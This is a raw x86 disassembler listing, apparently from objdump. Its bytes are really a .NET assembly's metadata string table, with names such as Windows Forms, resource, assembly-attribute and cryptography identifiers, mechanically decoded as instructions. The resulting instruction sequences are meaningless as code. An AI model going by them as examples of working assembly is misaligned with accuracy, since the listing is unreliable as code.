  402f31:	ins    BYTE PTR es:[edi],dx
  402f32:	add    BYTE PTR fs:[edi+0x65],ah
  402f36:	je     0x402f97
  402f38:	inc    ecx
  402f39:	dec    esi
  402f3a:	push   ebx
  402f3b:	dec    ecx
  402f3c:	inc    ebx
  402f3d:	outs   dx,DWORD PTR ds:[esi]
  402f3e:	fs gs push eax
  402f41:	popa   
  402f42:	add    BYTE PTR gs:[bx+0x65],ah
  402f47:	je     0x402fa8
  402f49:	dec    edi
  402f4a:	inc    ebp
  402f4b:	dec    ebp
  402f4c:	inc    ebx
  402f4d:	outs   dx,DWORD PTR ds:[esi]
  402f4e:	fs gs push eax
  402f51:	popa   
  402f52:	add    BYTE PTR gs:[bx+0x65],ah
  402f57:	je     0x402fb8
  402f59:	inc    ebx
  402f5a:	outs   dx,DWORD PTR ds:[esi]
  402f5b:	fs gs push eax
  402f5e:	popa   
  402f5f:	add    BYTE PTR gs:[bx+0x65],ah
  402f64:	je     0x402fc5
  402f66:	push   ebp
  402f67:	jae    0x402fca
  402f69:	add    BYTE PTR gs:[bx+0x65],ah
  402f6e:	je     0x402fcf
  402f70:	dec    ebp
  402f71:	gs jae 0x402fe7
  402f74:	popa   
  402f75:	add    BYTE PTR gs:[bp+si+0x75],dl
  402f7a:	outs   dx,BYTE PTR ds:[esi]
  402f7b:	je     0x402fe6
  402f7d:	ins    DWORD PTR es:[edi],dx
  402f7e:	gs push esp
  402f80:	jns    0x402ff2
  402f82:	gs dec eax
  402f84:	popa   
  402f85:	outs   dx,BYTE PTR ds:[esi]
  402f86:	fs ins BYTE PTR es:[edi],dx
  402f88:	add    BYTE PTR gs:[edi+0x65],al
  402f8c:	je     0x402fe2
  402f8e:	jns    0x403000
  402f90:	gs inc esi
  402f92:	jb     0x403003
  402f94:	ins    DWORD PTR es:[edi],dx
  402f95:	dec    eax
  402f96:	popa   
  402f97:	outs   dx,BYTE PTR ds:[esi]
  402f98:	fs ins BYTE PTR es:[edi],dx
  402f9a:	add    BYTE PTR gs:[ebx+0x79],dl
  402f9e:	jae    0x403014
  402fa0:	gs ins DWORD PTR es:[edi],dx
  402fa2:	push   edi
  402fa3:	bound  ecx,QWORD PTR gs:[ebp+0x6f]
  402fa7:	bound  ebp,QWORD PTR [ecx+0x6c]
  402faa:	add    BYTE PTR gs:[ebp+0x69],cl
  402fae:	arpl   WORD PTR [edx+0x6f],si
  402fb1:	jae    0x403022
  402fb3:	data16 je 0x40300c
  402fb6:	push   ebx
  402fb7:	inc    esp
  402fb8:	gs jae 0x403024
  402fbb:	outs   dx,BYTE PTR ds:[si]
  402fbd:	gs jb  0x40300d
  402fc0:	outs   dx,DWORD PTR ds:[esi]
  402fc1:	bound  ebp,QWORD PTR [ecx+0x6c]
  402fc4:	add    BYTE PTR gs:[ebx+0x6f],al
  402fc8:	outs   dx,BYTE PTR ds:[esi]
  402fc9:	jae    0x40303a
  402fcb:	ins    BYTE PTR es:[edi],dx
  402fcc:	add    BYTE PTR gs:[ecx+ebp*2+0x74],dl
  402fd1:	ins    BYTE PTR es:[edi],dx
  402fd2:	add    BYTE PTR gs:[ebx+0x79],dl
  402fd6:	jae    0x40304c
  402fd8:	gs ins DWORD PTR es:[edi],dx
  402fda:	push   edx
  402fdb:	jne    0x40304b
  402fdd:	je     0x403048
  402fdf:	ins    DWORD PTR es:[edi],dx
  402fe0:	gs push edi
  402fe2:	imul   ebp,DWORD PTR [esi+0x64],0x5273776f
  402fe9:	jne    0x403059
  402feb:	je     0x403056
  402fed:	ins    DWORD PTR es:[edi],dx
  402fee:	add    BYTE PTR gs:[edi+0x72],dl
  402ff2:	imul   esi,DWORD PTR [ebp+eiz*2+0x4c],0x656e69
  402ffa:	addr16 gs je 0x40305d
  402ffe:	inc    esp
  402fff:	outs   dx,DWORD PTR ds:[esi]
  403000:	outs   dx,BYTE PTR ds:[esi]
  403001:	add    BYTE PTR gs:[ecx+edi*2+0x70],dl
  403006:	add    BYTE PTR gs:[ebx+0x79],dl
  40300a:	jae    0x403080
  40300c:	gs ins DWORD PTR es:[edi],dx
  40300e:	inc    ebx
  40300f:	outs   dx,DWORD PTR ds:[esi]
  403010:	jb     0x403077
  403012:	add    BYTE PTR [ecx+0x64],al
  403015:	fs dec ecx
  403017:	outs   dx,BYTE PTR ds:[esi]
  403018:	push   ebx
  403019:	je     0x40308a
  40301b:	jb     0x403082
  40301d:	add    BYTE PTR [ebx+0x65],dl
  403020:	je     0x403065
  403022:	outs   dx,DWORD PTR ds:[esi]
  403023:	outs   dx,BYTE PTR ds:[esi]
  403024:	jae    0x403095
  403026:	ins    BYTE PTR es:[edi],dx
  403027:	gs push ebp
  403029:	dec    ecx
  40302a:	inc    ebx
  40302b:	jne    0x403099
  40302d:	je     0x4030a4
  40302f:	jb     0x403096
  403031:	add    BYTE PTR [edi+0x65],al
  403034:	je     0x403079
  403036:	outs   dx,DWORD PTR ds:[esi]
  403037:	outs   dx,BYTE PTR ds:[esi]
  403038:	jae    0x4030a9
  40303a:	ins    BYTE PTR es:[edi],dx
  40303b:	gs inc esi
  40303d:	popa   
  40303e:	ins    BYTE PTR es:[edi],dx
  40303f:	ins    BYTE PTR es:[edi],dx
  403040:	bound  esp,QWORD PTR [ecx+0x63]
  403043:	imul   edx,DWORD PTR [ebp+0x49],0x43
  403047:	jne    0x4030b5
  403049:	je     0x4030c0
  40304b:	jb     0x4030b2
  40304d:	add    BYTE PTR [edi+0x65],ah
  403050:	je     0x4030b1
  403052:	inc    ebx
  403053:	jne    0x4030c7
  403055:	jb     0x4030bc
  403057:	outs   dx,BYTE PTR ds:[esi]
  403058:	je     0x4030af
  40305a:	dec    ecx
  40305b:	inc    ebx
  40305c:	jne    0x4030ca
  40305e:	je     0x4030d5
  403060:	jb     0x4030c7
  403062:	add    BYTE PTR [ebx+0x65],dh
  403065:	je     0x4030c6
  403067:	inc    ebx
  403068:	jne    0x4030dc
  40306a:	jb     0x4030d1
  40306c:	outs   dx,BYTE PTR ds:[esi]
  40306d:	je     0x4030c4
  40306f:	dec    ecx
  403070:	inc    ebx
  403071:	jne    0x4030df
  403073:	je     0x4030ea
  403075:	jb     0x4030dc
  403077:	add    BYTE PTR [edi+0x65],ah
  40307a:	je     0x4030db
  40307c:	inc    ebx
  40307d:	jne    0x4030eb
  40307f:	je     0x4030f6
  403081:	jb     0x4030e8
  403083:	add    BYTE PTR [ebx+0x65],dh
  403086:	je     0x4030e7
  403088:	inc    ebx
  403089:	jne    0x4030f7
  40308b:	je     0x403102
  40308d:	jb     0x4030f4
  40308f:	add    BYTE PTR [edx+0x65],dh
  403092:	jae    0x403103
  403094:	jne    0x403108
  403096:	arpl   WORD PTR [ebp+0x43],sp
  403099:	jne    0x403107
  40309b:	je     0x403112
  40309d:	jb     0x403104
  40309f:	add    BYTE PTR [edi+0x65],ah
  4030a2:	je     0x403103
  4030a4:	inc    ebx
  4030a5:	jne    0x403119
  4030a7:	jb     0x40310e
  4030a9:	outs   dx,BYTE PTR ds:[esi]
  4030aa:	je     0x4030ef
  4030ac:	jne    0x40311a
  4030ae:	je     0x403125
  4030b0:	jb     0x403117
  4030b2:	add    BYTE PTR [edi+0x69],dl
  4030b5:	outs   dx,BYTE PTR ds:[esi]
  4030b6:	outs   dx,DWORD PTR fs:[esi]
  4030b8:	ja     0x40312d
  4030ba:	inc    edx
  4030bb:	popa   
  4030bc:	jae    0x403123
  4030be:	add    BYTE PTR [ebp+0x70],dl
  4030c1:	fs popa 
  4030c3:	je     0x40312a
  4030c5:	add    BYTE PTR [ebp+0x64],al
  4030c8:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x776f7242
  4030d0:	jae    0x403133
  4030d2:	bound  ebp,QWORD PTR [ebp+eiz*2+0x53]
  4030d6:	je     0x403139
  4030d8:	je     0x40313f
  4030da:	add    BYTE PTR [ebx+0x6f],al
  4030dd:	ins    DWORD PTR es:[edi],dx
  4030de:	jo     0x403149
  4030e0:	ins    BYTE PTR es:[edi],dx
  4030e1:	gs jb  0x40312b
  4030e4:	outs   dx,BYTE PTR gs:[esi]
  4030e6:	gs jb  0x40314a
  4030e9:	je     0x403150
  4030eb:	fs inc ecx
  4030ed:	je     0x403163
  4030ef:	jb     0x40315a
  4030f1:	bound  esi,QWORD PTR [ebp+0x74]
  4030f4:	add    BYTE PTR gs:[edi+0x65],al
  4030f8:	outs   dx,BYTE PTR ds:[esi]
  4030f9:	gs jb  0x40315d
  4030fc:	je     0x403163
  4030fe:	fs inc ebx
  403100:	outs   dx,DWORD PTR ds:[esi]
  403101:	fs gs inc ecx
  403104:	je     0x40317a
  403106:	jb     0x403171
  403108:	bound  esi,QWORD PTR [ebp+0x74]
  40310b:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  403110:	jne    0x403179
  403112:	addr16 gs jb 0x403164
  403116:	outs   dx,DWORD PTR ds:[esi]
  403117:	outs   dx,BYTE PTR ds:[esi]
  403118:	push   ebp
  403119:	jae    0x403180
  40311b:	jb     0x403160
  40311d:	outs   dx,DWORD PTR ds:[esi]
  40311e:	fs gs inc ecx
  403121:	je     0x403197
  403123:	jb     0x40318e
  403125:	bound  esi,QWORD PTR [ebp+0x74]
  403128:	add    BYTE PTR gs:[esi+0x65],cl
  40312c:	jne    0x4031a2
  40312e:	jb     0x403191
  403130:	ins    BYTE PTR es:[edi],dx
  403131:	push   edx
  403132:	gs jae 0x4031a4
  403135:	jne    0x4031a9
  403137:	arpl   WORD PTR [ebp+0x73],sp
  40313a:	dec    esp
  40313b:	popa   
  40313c:	outs   dx,BYTE PTR ds:[esi]
  40313d:	addr16 jne 0x4031a1
  403140:	addr16 gs inc ecx
  403143:	je     0x4031b9
  403145:	jb     0x4031b0
  403147:	bound  esi,QWORD PTR [ebp+0x74]
  40314a:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  40314f:	jne    0x4031b8
  403151:	addr16 popa 
  403153:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  403157:	je     0x4031cd
  403159:	jb     0x4031c4
  40315b:	bound  esi,QWORD PTR [ebp+0x74]
  40315e:	add    BYTE PTR gs:[ebp+0x64],al
  403162:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x776f7242
  40316a:	jae    0x4031cd
  40316c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  403170:	je     0x4031e6
  403172:	jb     0x4031dd
  403174:	bound  esi,QWORD PTR [ebp+0x74]
  403177:	add    BYTE PTR gs:[ebx+0x6f],al
  40317b:	ins    DWORD PTR es:[edi],dx
  40317c:	push   esi
  40317d:	imul   esi,DWORD PTR [ebx+0x69],0x41656c62
  403184:	je     0x4031fa
  403186:	jb     0x4031f1
  403188:	bound  esi,QWORD PTR [ebp+0x74]
  40318b:	add    BYTE PTR gs:[ecx+0x73],al
  40318f:	jae    0x4031f6
  403191:	ins    DWORD PTR es:[edi],dx
  403192:	bound  ebp,QWORD PTR [ecx+edi*2+0x4b]
  403196:	gs jns 0x4031df
  403199:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  4031a1:	bound  esi,QWORD PTR [ebp+0x74]
  4031a4:	add    BYTE PTR gs:[ecx+0x73],al
  4031a8:	jae    0x40320f
  4031aa:	ins    DWORD PTR es:[edi],dx
  4031ab:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  4031af:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x72747441
  4031b7:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  4031be:	jae    0x403233
  4031c0:	gs ins DWORD PTR es:[edi],dx
  4031c2:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  4031c6:	gs ins BYTE PTR es:[edi],dx
  4031c8:	popa   
  4031c9:	jns    0x40321e
  4031cb:	imul   esp,DWORD PTR [edi+0x6e],0x72747441
  4031d2:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  4031d9:	jae    0x40324e
  4031db:	gs ins DWORD PTR es:[edi],dx
  4031dd:	bound  ebp,QWORD PTR [ecx+edi*2+0x46]
  4031e1:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
  4031e9:	outs   dx,DWORD PTR ds:[esi]
  4031ea:	outs   dx,BYTE PTR ds:[esi]
  4031eb:	inc    ecx
  4031ec:	je     0x403262
  4031ee:	jb     0x403259
  4031f0:	bound  esi,QWORD PTR [ebp+0x74]
  4031f3:	add    BYTE PTR gs:[ecx+0x73],al
  4031f7:	jae    0x40325e
  4031f9:	ins    DWORD PTR es:[edi],dx
  4031fa:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  4031fe:	outs   dx,BYTE PTR ds:[esi]
  4031ff:	outs   dx,WORD PTR ds:[esi]
  403201:	jb     0x403270
  403203:	popa   
  403204:	je     0x40326f
  403206:	outs   dx,DWORD PTR ds:[esi]
  403207:	outs   dx,BYTE PTR ds:[esi]
  403208:	popa   
  403209:	ins    BYTE PTR es:[edi],dx
  40320a:	push   esi
  40320b:	gs jb  0x403281
  40320e:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  403215:	imul   esp,DWORD PTR [edx+0x75],0x53006574
  40321c:	popa   
  40321d:	je     0x403284
  40321f:	ins    BYTE PTR es:[edi],dx
  403220:	ins    BYTE PTR es:[edi],dx
  403221:	imul   esi,DWORD PTR [ebp+eiz*2+0x43],0x72746e6f
  403229:	popa   
  40322a:	arpl   WORD PTR [esi+edx*2+0x65],si
  40322e:	jb     0x4032a3
  403230:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  403237:	imul   esp,DWORD PTR [edx+0x75],0x4c006574
  40323e:	outs   dx,DWORD PTR ds:[esi]
  40323f:	popa   
  403240:	fs gs jb 0x403293
  403244:	jo     0x4032ba
  403246:	imul   ebp,DWORD PTR [ebp+0x69],0x6974617a
  40324d:	outs   dx,DWORD PTR ds:[esi]
  40324e:	outs   dx,BYTE PTR ds:[esi]
  40324f:	inc    ecx
  403250:	je     0x4032c6
  403252:	jb     0x4032bd
  403254:	bound  esi,QWORD PTR [ebp+0x74]
  403257:	add    BYTE PTR gs:[ecx+0x73],al
  40325b:	jae    0x4032c2
  40325d:	ins    DWORD PTR es:[edi],dx
  40325e:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  403262:	gs jae 0x4032c8
  403265:	jb     0x4032d0
  403267:	jo     0x4032dd
  403269:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  403270:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  403277:	jae    0x4032ec
  403279:	gs ins DWORD PTR es:[edi],dx
  40327b:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  40327f:	gs popaw 
  403282:	jne    0x4032f0
  403284:	je     0x4032c7
  403286:	ins    BYTE PTR es:[edi],dx
  403287:	imul   esp,DWORD PTR [ecx+0x73],0x72747441
  40328e:	imul   esp,DWORD PTR [edx+0x75],0x43006574
  403295:	outs   dx,DWORD PTR ds:[esi]
  403296:	ins    DWORD PTR es:[edi],dx
  403297:	jo     0x403302
  403299:	ins    BYTE PTR es:[edi],dx
  40329a:	popa   
  40329b:	je     0x403306
  40329d:	outs   dx,DWORD PTR ds:[esi]
  40329e:	outs   dx,BYTE PTR ds:[esi]
  40329f:	push   edx
  4032a0:	gs ins BYTE PTR es:[edi],dx
  4032a2:	popa   
  4032a3:	js     0x403306
  4032a5:	je     0x403310
  4032a7:	outs   dx,DWORD PTR ds:[esi]
  4032a8:	outs   dx,BYTE PTR ds:[esi]
  4032a9:	jae    0x4032ec
  4032ab:	je     0x403321
  4032ad:	jb     0x403318
  4032af:	bound  esi,QWORD PTR [ebp+0x74]
  4032b2:	add    BYTE PTR gs:[ecx+0x73],al
  4032b6:	jae    0x40331d
  4032b8:	ins    DWORD PTR es:[edi],dx
  4032b9:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  4032bd:	jb     0x40332e
  4032bf:	fs jne 0x403325
  4032c2:	je     0x403305
  4032c4:	je     0x40333a
  4032c6:	jb     0x403331
  4032c8:	bound  esi,QWORD PTR [ebp+0x74]
  4032cb:	add    BYTE PTR gs:[ecx+0x73],al
  4032cf:	jae    0x403336
  4032d1:	ins    DWORD PTR es:[edi],dx
  4032d2:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  4032d6:	outs   dx,DWORD PTR ds:[esi]
  4032d7:	jo     0x403352
  4032d9:	jb     0x403344
  4032db:	addr16 push 0x74744174
  4032e1:	jb     0x40334c
  4032e3:	bound  esi,QWORD PTR [ebp+0x74]
  4032e6:	add    BYTE PTR gs:[ebx+0x4c],al
  4032ea:	push   ebx
  4032eb:	inc    ebx
  4032ec:	outs   dx,DWORD PTR ds:[esi]
  4032ed:	ins    DWORD PTR es:[edi],dx
  4032ee:	jo     0x40335c
  4032f0:	imul   esp,DWORD PTR [ecx+0x6e],0x74744174
  4032f7:	jb     0x403362
  4032f9:	bound  esi,QWORD PTR [ebp+0x74]
  4032fc:	add    BYTE PTR gs:[ecx+0x73],al
  403300:	jae    0x403367
  403302:	ins    DWORD PTR es:[edi],dx
  403303:	bound  ebp,QWORD PTR [ecx+edi*2+0x53]
  403307:	imul   esp,DWORD PTR [edi+0x6e],0x72757461
  40330e:	gs dec ebx
  403310:	gs jns 0x403354
  403313:	je     0x403389
  403315:	jb     0x403380
  403317:	bound  esi,QWORD PTR [ebp+0x74]
  40331a:	add    BYTE PTR gs:[ecx+0x73],al
  40331e:	jae    0x403385
  403320:	ins    DWORD PTR es:[edi],dx
  403321:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  403325:	outs   dx,DWORD PTR ds:[esi]
  403326:	ins    DWORD PTR es:[edi],dx
  403327:	jo     0x40338a
  403329:	outs   dx,BYTE PTR ds:[esi]
  40332a:	jns    0x40336d
  40332c:	je     0x4033a2
  40332e:	jb     0x403399
  403330:	bound  esi,QWORD PTR [ebp+0x74]
  403333:	add    BYTE PTR gs:[edx+0x75],dl
  403337:	outs   dx,BYTE PTR ds:[esi]
  403338:	je     0x4033a3
  40333a:	ins    DWORD PTR es:[edi],dx
  40333b:	gs inc ebx
  40333d:	outs   dx,DWORD PTR ds:[esi]
  40333e:	ins    DWORD PTR es:[edi],dx
  40333f:	jo     0x4033a2
  403341:	je     0x4033ac
  403343:	bound  ebp,QWORD PTR [ecx+0x6c]
  403346:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x69727474
  40334e:	bound  esi,QWORD PTR [ebp+0x74]
  403351:	add    BYTE PTR gs:[esi+0x61],dh
  403355:	ins    BYTE PTR es:[edi],dx
  403356:	jne    0x4033bd
  403358:	add    BYTE PTR [ecx+0x64],al
  40335b:	fs dec ecx
  40335d:	outs   dx,BYTE PTR ds:[esi]
  40335e:	push   ebp
  40335f:	je     0x4033ca
  403361:	ins    BYTE PTR es:[edi],dx
  403362:	cs gs js 0x4033cb
  403366:	add    BYTE PTR [ecx+0x73],al
  403369:	jae    0x4033d0
  40336b:	ins    DWORD PTR es:[edi],dx
  40336c:	bound  ebp,QWORD PTR [ecx+edi*2+0x52]
  403370:	data16 add BYTE PTR gs:[ebx+0x79],dl
  403375:	jae    0x4033eb
  403377:	gs ins DWORD PTR es:[edi],dx
  403379:	cs push esp
  40337b:	push   0x64616572
  403380:	imul   ebp,DWORD PTR [esi+0x67],0x74656700
  403387:	pop    edi
  403388:	dec    edi
  403389:	jne    0x4033ff
  40338b:	jo     0x403402
  40338d:	je     0x4033d4
  40338f:	outs   dx,BYTE PTR ds:[esi]
  403390:	arpl   WORD PTR [edi+0x64],bp
  403393:	imul   ebp,DWORD PTR [esi+0x67],0x73795300
  40339a:	je     0x403401
  40339c:	ins    DWORD PTR es:[edi],dx
  40339d:	dec    ebp
  40339e:	gs jae 0x403414
  4033a1:	popa   
  4033a2:	imul   ebp,DWORD PTR [bp+0x67],0x74656700
  4033aa:	pop    edi
  4033ab:	push   edi
  4033ac:	popa   
  4033ad:	jb     0x40341d
  4033af:	imul   ebp,DWORD PTR [esi+0x67],0x536f5400
  4033b6:	je     0x40342a
  4033b8:	imul   ebp,DWORD PTR [esi+0x67],0x74654700
  4033bf:	push   ebx
  4033c0:	je     0x403434
  4033c2:	imul   ebp,DWORD PTR [esi+0x67],0x62755300
  4033c9:	jae    0x40343f
  4033cb:	jb     0x403436
  4033cd:	outs   dx,BYTE PTR ds:[esi]
  4033ce:	add    BYTE PTR [bp+di+0x79],dl
  4033d2:	jae    0x403448
  4033d4:	gs ins DWORD PTR es:[edi],dx
  4033d6:	push   edx
  4033d7:	jne    0x403447
  4033d9:	je     0x403444
  4033db:	ins    DWORD PTR es:[edi],dx
  4033dc:	gs push edx
  4033de:	gs ins DWORD PTR es:[edi],dx
  4033e0:	outs   dx,DWORD PTR ds:[esi]
  4033e1:	je     0x40344c
  4033e3:	outs   dx,BYTE PTR ds:[esi]
  4033e4:	add    BYTE PTR [bp+di+0x79],dl
  4033e8:	jae    0x40345e
  4033ea:	gs ins DWORD PTR es:[edi],dx
  4033ec:	cs inc ecx
  4033ee:	fs fs dec ecx
  4033f1:	outs   dx,BYTE PTR ds:[esi]
  4033f2:	cs dec eax
  4033f4:	outs   dx,DWORD PTR ds:[esi]
  4033f5:	jae    0x40346b
  4033f7:	imul   ebp,DWORD PTR [esi+0x67],0x73795300
  4033fe:	je     0x403465
  403400:	ins    DWORD PTR es:[edi],dx
  403401:	push   edi
  403402:	bound  edx,QWORD PTR gs:[edx+0x6f]
  403406:	jne    0x40347c
  403408:	imul   ebp,DWORD PTR [esi+0x67],0x73795300
  40340f:	je     0x403476
  403411:	ins    DWORD PTR es:[edi],dx
  403412:	inc    esp
  403413:	jb     0x403476
  403415:	ja     0x403480
  403417:	outs   dx,BYTE PTR ds:[esi]
  403418:	add    BYTE PTR [bx+0x65],al
  40341c:	je     0x403464
  40341e:	jne    0x40348c
  403420:	ins    BYTE PTR es:[edi],dx
  403421:	push   eax
  403422:	popa   
  403423:	je     0x40348d
  403425:	add    BYTE PTR [ebx+0x74],dl
  403428:	popa   
  403429:	jb     0x40349f
  40342b:	jae    0x403484
  40342d:	imul   esi,DWORD PTR [eax+ebp*2+0x0],0x74737953
  403435:	gs ins DWORD PTR es:[edi],dx
  403437:	cs inc ebx
  403439:	outs   dx,DWORD PTR ds:[esi]
  40343a:	ins    DWORD PTR es:[edi],dx
  40343b:	jo     0x4034ac
  40343d:	outs   dx,BYTE PTR ds:[esi]
  40343e:	outs   dx,BYTE PTR gs:[esi]
  403440:	je     0x40348f
  403442:	outs   dx,DWORD PTR ds:[esi]
  403443:	fs gs ins BYTE PTR es:[edi],dx
  403446:	add    BYTE PTR [ecx+0x64],al
  403449:	fs dec ecx
  40344b:	outs   dx,BYTE PTR ds:[esi]
  40344c:	push   ebp
  40344d:	je     0x4034b8
  40344f:	ins    BYTE PTR es:[edi],dx
  403450:	add    BYTE PTR [ebx+0x79],dl
  403453:	jae    0x4034c9
  403455:	gs ins DWORD PTR es:[edi],dx
  403457:	inc    ebx
  403458:	outs   dx,DWORD PTR ds:[esi]
  403459:	outs   dx,BYTE PTR ds:[esi]
  40345a:	imul   sp,WORD PTR [edi+0x75],0x6172
  403460:	je     0x4034cb
  403462:	outs   dx,DWORD PTR ds:[esi]
  403463:	outs   dx,BYTE PTR ds:[esi]
  403464:	dec    ecx
  403465:	outs   dx,BYTE PTR ds:[esi]
  403466:	jae    0x4034dc
  403468:	popa   
  403469:	ins    BYTE PTR es:[edi],dx
  40346a:	ins    BYTE PTR es:[edi],dx
  40346b:	add    BYTE PTR [ebp+0x63],al
  40346e:	ins    DWORD PTR es:[edi],dx
  40346f:	popa   
  403470:	push   eax
  403471:	jne    0x4034d5
  403473:	ins    BYTE PTR es:[edi],dx
  403474:	imul   esp,DWORD PTR [ebx+0x4b],0x75467965
  40347b:	ins    BYTE PTR es:[edi],dx
  40347c:	ins    BYTE PTR es:[edi],dx
  40347d:	add    BYTE PTR [ebx+0x68],dl
  403480:	popa   
  403481:	jb     0x4034e8
  403483:	fs dec esp
  403485:	imul   esp,DWORD PTR [edx+0x50],0x696c6275
  40348c:	arpl   WORD PTR [ebx+0x65],cx
  40348f:	jns    0x4034d7
  403491:	jne    0x4034ff
  403493:	ins    BYTE PTR es:[edi],dx
  403494:	add    BYTE PTR [ebx+0x69],dl
  403497:	ins    BYTE PTR es:[edi],dx
  403498:	jbe    0x4034ff
  40349a:	jb     0x403508
  40349c:	imul   esp,DWORD PTR [edi+0x68],0x616c5074
  4034a3:	je     0x40350b
  4034a5:	outs   dx,DWORD PTR ds:[esi]
  4034a6:	jb     0x403515
  4034a8:	push   eax
  4034a9:	jne    0x40350d
  4034ab:	ins    BYTE PTR es:[edi],dx
  4034ac:	imul   esp,DWORD PTR [ebx+0x4b],0x75467965
  4034b3:	ins    BYTE PTR es:[edi],dx
  4034b4:	ins    BYTE PTR es:[edi],dx
  4034b5:	add    BYTE PTR [ebp+0x69],cl
  4034b8:	arpl   WORD PTR [edx+0x6f],si
  4034bb:	jae    0x40352c
  4034bd:	data16 je 0x403510
  4034c0:	jne    0x403524
  4034c2:	ins    BYTE PTR es:[edi],dx
  4034c3:	imul   esp,DWORD PTR [ebx+0x4b],0x75467965
  4034ca:	ins    BYTE PTR es:[edi],dx
  4034cb:	ins    BYTE PTR es:[edi],dx
  4034cc:	add    BYTE PTR [ebx+0x69],dl
  4034cf:	ins    BYTE PTR es:[edi],dx
  4034d0:	jbe    0x403537
  4034d2:	jb     0x403540
  4034d4:	imul   esp,DWORD PTR [edi+0x68],0x62755074
  4034db:	ins    BYTE PTR es:[edi],dx
  4034dc:	imul   esp,DWORD PTR [ebx+0x4b],0x75467965
  4034e3:	ins    BYTE PTR es:[edi],dx
  4034e4:	ins    BYTE PTR es:[edi],dx
  4034e5:	add    BYTE PTR [ebx+0x79],dl
  4034e8:	jae    0x40355e
  4034ea:	gs ins DWORD PTR es:[edi],dx
  4034ec:	pop    eax
  4034ed:	ins    DWORD PTR es:[edi],dx
  4034ee:	ins    BYTE PTR es:[edi],dx
  4034ef:	add    BYTE PTR [ebx+0x79],dl
  4034f2:	jae    0x403568
  4034f4:	gs ins DWORD PTR es:[edi],dx
  4034f6:	push   edx
  4034f7:	jne    0x403567
  4034f9:	je     0x403564
  4034fb:	ins    DWORD PTR es:[edi],dx
  4034fc:	gs push edi
  4034fe:	imul   ebp,DWORD PTR [esi+0x64],0x5273776f
  403505:	jne    0x403575
  403507:	je     0x403572
  403509:	ins    DWORD PTR es:[edi],dx
  40350a:	gs push ebp
  40350c:	dec    ecx
  40350d:	pop    eax
  40350e:	popa   
  40350f:	ins    DWORD PTR es:[edi],dx
  403510:	ins    BYTE PTR es:[edi],dx
  403511:	add    BYTE PTR [ebx+0x79],dl
  403514:	jae    0x40358a
  403516:	gs ins DWORD PTR es:[edi],dx
  403518:	add    BYTE PTR [ebx+0x79],dl
  40351b:	jae    0x403591
  40351d:	gs ins DWORD PTR es:[edi],dx
  40351f:	cs inc ecx
  403521:	fs fs dec ecx
  403524:	outs   dx,BYTE PTR ds:[esi]
  403525:	add    BYTE PTR [edx+0x65],dh
  403528:	jae    0x403599
  40352a:	jne    0x40359e
  40352c:	arpl   WORD PTR [ebp+0x4d],sp
  40352f:	popa   
  403530:	outs   dx,BYTE PTR ds:[esi]
  403531:	add    BYTE PTR [ebp+0x63],al
  403534:	ins    DWORD PTR es:[edi],dx
  403535:	popa   
  403536:	push   eax
  403537:	jne    0x40359b
  403539:	ins    BYTE PTR es:[edi],dx
  40353a:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  403541:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  403545:	push   ebx
  403546:	push   0x64657261
  40354b:	dec    esp
  40354c:	imul   esp,DWORD PTR [edx+0x50],0x696c6275
  403553:	arpl   WORD PTR [ebx+0x65],cx
  403556:	jns    0x4035ac
  403558:	outs   dx,DWORD PTR ds:[esi]
  403559:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  40355d:	push   ebx
  40355e:	imul   ebp,DWORD PTR [esi+esi*2+0x65],0x67696c72
  403566:	push   0x616c5074
  40356b:	je     0x4035d3
  40356d:	outs   dx,DWORD PTR ds:[esi]
  40356e:	jb     0x4035dd
  403570:	push   eax
  403571:	jne    0x4035d5
  403573:	ins    BYTE PTR es:[edi],dx
  403574:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  40357b:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  40357f:	dec    ebp
  403580:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  403587:	je     0x4035d9
  403589:	jne    0x4035ed
  40358b:	ins    BYTE PTR es:[edi],dx
  40358c:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  403593:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  403597:	push   ebx
  403598:	imul   ebp,DWORD PTR [esi+esi*2+0x65],0x67696c72
  4035a0:	push   0x62755074
  4035a5:	ins    BYTE PTR es:[edi],dx
  4035a6:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  4035ad:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  4035b1:	push   ebx
  4035b2:	jns    0x403627
  4035b4:	je     0x40361b
  4035b6:	ins    DWORD PTR es:[edi],dx
  4035b7:	push   edi
  4035b8:	bound  eax,QWORD PTR gs:[ecx+edi*2+0x6e]
  4035bd:	popa   
  4035be:	ins    DWORD PTR es:[edi],dx
  4035bf:	imul   esp,DWORD PTR [ebx+0x44],0x44617461
  4035c6:	gs jae 0x403632
  4035c9:	outs   dx,BYTE PTR ds:[si]
  4035cb:	add    BYTE PTR [ebp+0x69],cl
  4035ce:	arpl   WORD PTR [edx+0x6f],si
  4035d1:	jae    0x403642
  4035d3:	data16 je 0x40362d
